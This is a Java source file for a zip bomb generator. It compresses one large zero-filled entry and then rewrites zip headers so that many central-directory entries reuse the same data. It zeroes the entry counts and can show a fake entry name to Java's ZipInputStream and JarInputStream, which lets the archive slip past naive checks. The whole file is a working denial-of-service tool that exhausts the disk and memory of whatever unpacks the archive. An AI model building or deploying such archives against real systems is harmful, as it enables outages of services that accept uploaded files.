package ml.rektsky.zipbomb;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Function;
import java.util.zip.Deflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipBombGenerator {

    public static final int FILE_AMOUNT_LIMIT = Integer.MAX_VALUE - 2;

    public static class Builder {
        private final Function<Integer, String> fileName;
        private final int filesAmount;
        private final int fileSize;
        private String fakeEntryName = null;

        /**
         * Create a ZipBomb generator builder config..
         * @param fileName What will the file name be? Some unzip tools will avoid duplicated entries, so having a function that
         *                 generates unique file names is better.
         * @param filesAmount How many files should be added? The max value is FILE_AMOUNT_LIMIT  (Unsigned Short Limit)
         * @param fileSize How large a single file will be? The max value is {@link Integer#MAX_VALUE} - 2
         */
        public Builder(Function<Integer, String> fileName, int filesAmount, int fileSize) {
            if (fileSize >= Integer.MAX_VALUE - 1) {
                throw new IllegalArgumentException("File size too large! Max value: Integer.MAX_VALUE - 2 (JVM Array Size Limit)");
            }
            if (filesAmount > FILE_AMOUNT_LIMIT) {
                throw new IllegalArgumentException("Files amount large! Max value: " + FILE_AMOUNT_LIMIT + " (Zip Limit)");
            }
            this.fileName = fileName;
            this.filesAmount = filesAmount;
            this.fileSize = fileSize;
        }

        /**
         * When <code>ZipInputStream</code> / <code>JarInputStream</code> are attempting to read the zip file, what should
         * the fake name be? Leave it null (default) to disable it
         * @param name The static name of the all the files
         * @return The builder itself
         */
        public Builder fakeEntryName(String name) {
            fakeEntryName = name;
            return this;
        }


        public ZipBombGenerator build() {
            ZipBombGenerator generator = new ZipBombGenerator(fileName, filesAmount, fileSize);
            generator.fakeEntryName = fakeEntryName;
            return generator;
        }
    }

    private final Function<Integer, String> fileName;
    private final int filesAmount;
    private final int fileSize;

    public String fakeEntryName = null;


    /**
     * Create a ZipBomb generator instance with config..
     * @param fileName What will the file name be? Some unzip tools will avoid duplicated entries, so having a function that
     *                 generates unique file names is better.
     * @param filesAmount How many files should be added?
     * @param fileSize How large a single file will be? The max value is {@link Integer#MAX_VALUE} - 2
     */
    public ZipBombGenerator(Function<Integer, String> fileName, int filesAmount, int fileSize) {
        if (fileSize >= Integer.MAX_VALUE) {
            throw new IllegalArgumentException("File size too large! Max value: Integer.MAX_VALUE - 2 (JVM Array Size Limit)");
        }
        if (filesAmount > FILE_AMOUNT_LIMIT) {
            throw new IllegalArgumentException("Files amount large! Max value: " + FILE_AMOUNT_LIMIT + " (Zip Limit)");
        }
        this.fileName = fileName;
        this.filesAmount = filesAmount;
        this.fileSize = fileSize;
    }

    /**
     * Add <code>entries</code> to a zip file, and zipbomb it.
     * @param entries The entries you want to add to a zip file
     * @return The raw byte array of the zip file
     */
    public byte[] create(Map<ZipEntry, byte[]> entries) throws IOException {
        // Argument Check
        if (filesAmount + entries.size() > FILE_AMOUNT_LIMIT) {
            throw new IllegalArgumentException("Too many files to add! Max files amount: " + FILE_AMOUNT_LIMIT + " but got " + (filesAmount + entries.size()));
        }
        String addedFileName = this.fileName.apply(0);

        // Add original entry and compress to zip file
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
        ZipOutputStream out = new ZipOutputStream(byteBuffer);

        out.setLevel(Deflater.BEST_COMPRESSION); // Decrease the file size

        out.putNextEntry(new ZipEntry(addedFileName));
        out.write(new byte[fileSize]);
        out.closeEntry();
        for (Map.Entry<ZipEntry, byte[]> entry : entries.entrySet()) {
            if (entry.getKey().getName().equals(addedFileName)) {
                throw new IllegalArgumentException("Generated file name is already used in the zip file. (" + addedFileName + ")");
            }
            out.putNextEntry(entry.getKey());
            out.write(entry.getValue());
            out.closeEntry();
        }
        out.close();
        byte[] input = byteBuffer.toByteArray();
        List<Byte> output = new ArrayList<>();
        List<Byte> inputList = new ArrayList<>();
        for (int i = 0; i < input.length; i++) {
            inputList.add(input[i]);
        }

        if (input[0] == 0x50 && input[1] == 0x4B && input[2] == 0x03 && input[3] == 0x04) {} else {
            throw new IllegalStateException("Expected 0x04034B50 at offset 0  (Zip file signature). It's definitely an issue, please report this.");
        }

        int offset = 0;
        int addedLength = 0;
        int reducedLocalHeadersLength = 0;
        int lhIndex = 0;

        while (true) {
            if (offset == input.length) {
                byte[] outputBuffer = new byte[output.size()];
                for (int i = 0; i < output.size(); i++) {
                    outputBuffer[i] = output.get(i);
                }
                return outputBuffer;
            }

            if (offset + 4 < input.length) {
                if (input[offset] == 0x50 && input[offset + 1] == 0x4B && input[offset + 2] == 0x03 && input[offset + 3] == 0x04) {
                    if (fakeEntryName != null) {
                        lhIndex++;
                        int fileNameLength = input[offset + 26] | input[offset + 27] << 8;
                        byte[] realFileName = new byte[fileNameLength];
                        List<Byte> bytes = inputList.subList(offset + 30, offset + 30 + fileNameLength);
                        for (int i = 0; i < bytes.size(); i++) {
                            realFileName[i] = bytes.get(i);
                        }
                        byte[] fakeFileName = fakeEntryName.getBytes(StandardCharsets.UTF_8);

                        if (lhIndex == 1) {
                            fakeFileName = realFileName;
                        }
                        int fakeFileNameLength = fakeFileName.length;
                        int extraFieldLength = input[offset + 28] | input[offset + 29] << 8;
                        output.addAll(inputList.subList(offset, offset + 26));
                        output.add((byte) (fakeFileNameLength));
                        output.add((byte) (fakeFileNameLength >> 8));
                        output.addAll(inputList.subList(offset + 28, offset + 30));
                        for (int i = 0; i < fakeFileNameLength; i++) {
                            output.add(fakeFileName[i]);
                        }
                        output.addAll(inputList.subList(offset + 30 + fileNameLength, offset + 30 + fileNameLength + extraFieldLength));
                        offset += 30 + fileNameLength + extraFieldLength;
                        reducedLocalHeadersLength += (fileNameLength - fakeFileNameLength);
                        continue;
                    }
                }
                if (input[offset] == 0x50 && input[offset + 1] == 0x4B && input[offset + 2] == 0x05 && input[offset + 3] == 0x06) {
                    int entriesCountA = ByteBuffer.wrap(new byte[] {input[offset + 9], input[offset + 8]}).getShort();
                    int entriesCountB = ByteBuffer.wrap(new byte[] {input[offset + 11], input[offset + 10]}).getShort();
                    int oldSize = ByteBuffer.wrap(new byte[] {input[offset + 15], input[offset + 14], input[offset + 13], input[offset + 12]}).getInt();
                    int oldLocalHeadersSize = ByteBuffer.wrap(new byte[] {input[offset + 19], input[offset + 18], input[offset + 17], input[offset + 16]}).getInt();
                    entriesCountA += filesAmount - 1;
                    entriesCountB += filesAmount - 1;
                    entriesCountA = 0;
                    entriesCountB = 0;
                    ByteBuffer a = ByteBuffer.allocate(2);
                    a.putShort((short) entriesCountA);
                    ByteBuffer b = ByteBuffer.allocate(2);
                    b.putShort((short) entriesCountB);
                    ByteBuffer size = ByteBuffer.allocate(4);
                    size.putInt(addedLength + oldSize);
                    ByteBuffer localHeadersSize = ByteBuffer.allocate(4);
                    localHeadersSize.putInt(oldLocalHeadersSize - reducedLocalHeadersLength);
                    a.flip();
                    b.flip();
                    size.flip();
                    localHeadersSize.flip();
                    input[offset + 9] = a.get();
                    input[offset + 8] = a.get();
                    input[offset + 11] = b.get();
                    input[offset + 10] = b.get();

                    input[offset + 15] = size.get();
                    input[offset + 14] = size.get();
                    input[offset + 13] = size.get();
                    input[offset + 12] = size.get();

                    input[offset + 19] = localHeadersSize.get();
                    input[offset + 18] = localHeadersSize.get();
                    input[offset + 17] = localHeadersSize.get();
                    input[offset + 16] = localHeadersSize.get();
                }

                if (input[offset] == 0x50 && input[offset + 1] == 0x4B && input[offset + 2] == 0x01 && input[offset + 3] == 0x02) {


                    int fileNameLength = ByteBuffer.wrap(new byte[] {input[offset + 29], input[offset + 28]}).getShort();
                    int extraFieldLength = ByteBuffer.wrap(new byte[] {input[offset + 31], input[offset + 30]}).getShort();
                    int fileCommentLength = ByteBuffer.wrap(new byte[] {input[offset + 33], input[offset + 32]}).getShort();
                    List<Byte> fileNameBufferList = inputList.subList(offset + 46, offset + 46 + fileNameLength);
                    byte[] fileNameBuffer = new byte[fileNameBufferList.size()];
                    for (int i = 0; i < fileNameBufferList.size(); i++) {
                        fileNameBuffer[i] = fileNameBufferList.get(i);
                    }
                    String entryFileName = new String(fileNameBuffer);



                    int end = offset + 46 + fileNameLength + extraFieldLength + fileCommentLength;
                    if (entryFileName.equals(addedFileName)) {
                        List<Byte> added = new ArrayList<>();
                        for (int i = 1; i < filesAmount; i++) {
                            String newFileName = fileName.apply(i);
                            added.addAll(inputList.subList(offset, offset + 28));
                            byte[] fileNameByteArray = newFileName.getBytes(StandardCharsets.UTF_8);
                            added.add((byte) (fileNameByteArray.length));
                            added.add((byte) (fileNameByteArray.length << 8));
                            added.addAll(inputList.subList(offset + 30, offset + 46));
                            for (int i1 = 0; i1 < fileNameByteArray.length; i1++) {
                                added.add(fileNameByteArray[i1]);
                            }
                            added.addAll(inputList.subList(offset + 46 + fileNameLength, end));
                        }
                        addedLength += added.size();
                        output.addAll(added);
                    }
                }
            }

            output.add(input[offset]);
            offset++;
        }



    }

}
